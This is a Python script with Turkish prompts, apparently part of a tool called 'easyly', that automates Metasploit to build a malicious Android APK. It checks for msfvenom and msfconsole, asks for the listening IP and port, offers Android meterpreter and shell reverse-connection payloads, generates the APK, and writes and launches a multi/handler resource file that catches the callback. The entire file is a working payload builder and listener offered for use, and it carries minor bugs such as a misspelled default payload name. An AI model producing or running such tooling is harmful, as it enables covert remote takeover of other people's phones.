#!/usr/bin/python3
# -*- coding: utf-8 -*-

#coder:easyly
#standart burakgunerassistant module




import os
import shell

# Consol Renkleri
W = '\033[0m'  # Beyaz (normal)
R = '\033[31m'  # Kırmızı
G = '\033[32m'  # Yeşil
O = '\033[33m'  # Turuncu
B = '\033[34m'  # Mavi
P = '\033[35m'  # Mor
C = '\033[36m'  # Cyan
GR = '\033[37m'  # Gri


#----------------------
def checkmsf():
    list=os.listdir('/usr/bin')
    sayac=list.count("msfvenom")
    sayac2=list.count("msfconsole")
    if sayac==1:
        pass
    if sayac2==1:
        pass
    else:
        print(R+"Lutfen gerekli paketleri yukeyin(msfconsole,msfvenom)"+W)
        exit()
         
ayarlar=["127.0.0.1",4444,"android/meterpretrer/reverse_tcp","/root/easyly"]

#----------------------
def dosyacr():
    liste=os.listdir(os.getcwd())
    kontrol=liste.count("autoply")
    if kontrol==1:
        pass
    else: 
        yol=os.getcwd()+"/autoply"
        os.makedirs(yol)
        easyly=open(os.getcwd()+"/autoply/easyly.rc","w")
        
        
   
#---------------------      
def local_ip():
    ayarlar[0]=shell.ip


#---------------------
def set_payload():
    print(G+"Uygun payloadlar: ")
    print("""
        [1] android/meterpreter/reverse_tcp (onerilen)
        [2] android/meterpreter/reverse_http
        [3] android/meterpreter/reverse_https
        [4] android/shell/reverse_http
        [5] android/shell/reverse_https""")
    cmd=int(input('easyly> '))
    print(cmd)
        

    if cmd==1:
        print(P+"payload ==> android/meterpreter/reverse_tcp")
        ayarlar[2]="android/meterpreter/reverse_tcp"
        

    elif cmd==2:
        print(P+"payload ==> android/meterpreter/reverse_http")
        ayarlar[2]="android/meterpreter/reverse_http"
        
 
    elif cmd==3:
        print(P+"payload ==> android/meterpreter/reverse_https")
        ayarlar[2]="android/meterpreter/reverse_https"
        
    
    elif cmd==4:
        print(P+"payload ==>android/shell/reverse_http")
        ayarlar[2]="android/shell/reverse_http"
        
  
  
    elif cmd==5:
         print(P+"payload ==>android/shell/reverse_https")
         ayarlar[2]="android/shell/reverse_https"
         
         
    else :
         print(R+"Lutfen payload seciniz"+W)
         set_payload()
#----------------------------        
    
def set_port():
    try:
        port=input(G+"Lutfen port seciniz[4444]: ")
        if not port:
            ayarlar[1]=4444
        else:
            ayarlar[1]=port
        print(P+"PORT==> ", ayarlar[1])
    except:
        print(R"Lutfen gecerli bir port numarasi girin"+W)
        set_port()
    
    
           
#-------------------------

def set_path():
    path=input(G+"Lutfen dosyanin kaydedilecegi yeri yaziniz(varsayilan "+os.getcwd()+")")
    try:
        if path=="":
            print(P+"Cikis dizini : ",os.getcwd())
            ayarlar[3]=os.getcwd()
        else:
            ayarlar[3]=path
    except:
        print(R+"Lutfen gereli bir dizin girin"+W)
        set_path()

#--------------------
def olustur():
    bilgiler="""[*] Payload olusturuluyor...
    LHOST= {}
    LPORT= {}
    PAYLOAD= {}
    DIZIN= {}""".format(ayarlar[0],ayarlar[1],ayarlar[2],ayarlar[3])
    print(C+bilgiler+O)
    
    komut="msfvenom -p {} LPORT={} LHOST={} -o {}/easyly.apk".format(ayarlar[2],ayarlar[1],ayarlar[0],ayarlar[3])
    os.system(komut)
#-------------------    
def connect_msf():
    rc=open(os.getcwd()+"/autoply/easyly.rc","r+")
    yazilacak="use exploit/multi/handler\nset payload {}\nset lhost {}\nset lport {}\nexploit -j".format(ayarlar[2],ayarlar[0],ayarlar[1])
    rc.write(yazilacak)
    rc.close()
    os.system("msfconsole -r "+os.getcwd()+"/autoply/easyly.rc")
    

#-------------------
def soru():
    soru1=input(G+"Hangisini Kulanacaksiniz[WAN/LAN]\n>> ").lower()
    if soru1=="wan":
        soru2=input("Lutfe Dis IP nizi yaziniz: ")
        ayarlar[0]=soru2
    else:
        local_ip()
#-------------
    
def soru2():
    n=input("Payload dinlemeye alinsin mi[e/h]\n>>").lower()
    if n=="e":
        print("Msfconsole aciliyor...")
        connect_msf()
    else:
        shell.shell()

#---------------
def autopystart():
    dosyacr()
    soru()
    set_payload()
    set_port()
    set_path()
    olustur()
    soru2()
    shell.shell()
 

    
   


    
        
        
            
    
        





